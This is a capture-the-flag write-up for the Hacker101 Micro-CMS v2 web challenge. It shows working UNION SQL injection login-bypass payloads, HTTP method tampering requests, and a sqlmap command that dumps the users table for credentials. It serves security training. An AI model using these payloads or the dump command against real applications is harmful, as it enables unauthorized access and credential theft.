# Micro-CMS v2 — Hacker101 CTF Write-Up

## Overview

Micro-CMS v2 is a web application challenge from Hacker101 CTF featuring three flags involving SQL injection, HTTP method tampering, and credential extraction.

---

## Flag0 — UNION SQL Injection (Login Bypass)

**Hint:** *"More perfect union"*

The `/login` endpoint is vulnerable to SQL injection in the `username` parameter.

### Steps

1. Find the column count using `ORDER BY`:
```
username=' ORDER BY 1-- -
```
Continue incrementing until the response changes.

2. Craft a `UNION SELECT` payload with the correct column count:
```
username=' UNION SELECT 1,2-- -
```

3. The flag appears in the response when the bypass succeeds.

---

## Flag1 — HTTP Method Tampering

**Hints:**
- *"Just because request fails with one method doesn't mean it will fail with a different method"*
- *"Different requests often have different required authorization"*

The application blocks `POST` requests to create/edit pages for non-admin users, but other HTTP methods like `PUT`, `PATCH`, or `DELETE` are not properly checked.

### Steps

1. Log in using UNION bypass (Flag0) or valid credentials from Flag2.
2. Capture the session cookie from the response.
3. Modify a page using an alternative HTTP method:
```http
PATCH /page/1 HTTP/1.1
Cookie: <session>
```
or create a new page:
```http
PUT /page/create HTTP/1.1
Cookie: <session>
Content-Type: application/x-www-form-urlencoded

title=x&body=x
```
4. The flag is returned in the response.

---

## Flag2 — Database Credential Dump

**Hint:** *"Credentials are secret, flags are secret — coincidence?"*

The password stored in the database **is** the flag itself.

### Steps

1. Run sqlmap against the login form:
```bash
sqlmap -u "https://<instance>.ctf.hacker101.com/login" \
  --data="username=admin&password=admin" \
  --level=3 --dump --batch --time-sec=1 --threads=10
```

2. sqlmap extracts the users table. The password field contains **Flag2**.

3. These credentials also work for normal login (e.g., `vilma:<flag_value>`).

---

## Tools Used

- **Burp Suite** — HTTP interception, Repeater for payload testing
- **sqlmap** — Automated SQL injection and database extraction
- **curl** — Quick manual request testing

## Flag Summary

| Flag | Technique | Difficulty |
|------|-----------|------------|
| Flag0 | UNION SQLi | Easy |
| Flag1 | Method Tampering | Medium |
| Flag2 | sqlmap Dump | Easy-Medium |
